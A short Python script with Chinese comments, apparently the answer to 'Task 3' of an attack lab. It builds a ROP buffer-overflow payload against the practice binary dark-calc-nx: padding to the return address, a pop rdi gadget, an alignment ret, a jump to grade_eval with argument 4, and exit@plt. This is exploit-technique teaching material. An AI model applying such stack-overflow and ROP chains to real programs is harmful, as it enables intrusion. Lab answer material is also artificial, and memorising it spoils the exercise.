"""Task 3: build the payload for attack/dark-calc-nx.

dark-calc-nx 栈不可执行、栈地址随机，但代码段是非 PIE（地址固定），因此用 ROP：
用 __libc_csu_init 尾部的那段字节里找出的 "pop rdi; ret"（0x401a33，非对齐字节）
把 edi 设为 4，再跳 grade_eval(0x401978) 打印目标字符串，最后 exit@plt 干净退出。
"""
import struct
import sys

RET_OFFSET = 0x18                   # input(): 缓冲区 rbp-0x10 -> 返回地址 rbp+8

POP_RDI = 0x401A33                  # 5f c3        （pop r15; ret 的第二个字节起）
RET = 0x401A34                      # c3           （纯 ret，用来调整 16 字节对齐）
GRADE_EVAL = 0x401978
EXIT_PLT = 0x4016E0

chain = [
    POP_RDI,                        # pop rdi; ret
    4,                              # 第 1 个参数 = 4
    RET,                            # 对齐：进入 grade_eval 时 rsp % 16 == 8
    GRADE_EVAL,                     # grade_eval(4)
    EXIT_PLT,                       # exit@plt
    0,                              # exit 的返回值被覆盖，无所谓
]

payload = b"A" * RET_OFFSET
payload += b"".join(struct.pack("<Q", q) for q in chain)
payload += b"\n"

sys.stdout.buffer.write(payload)
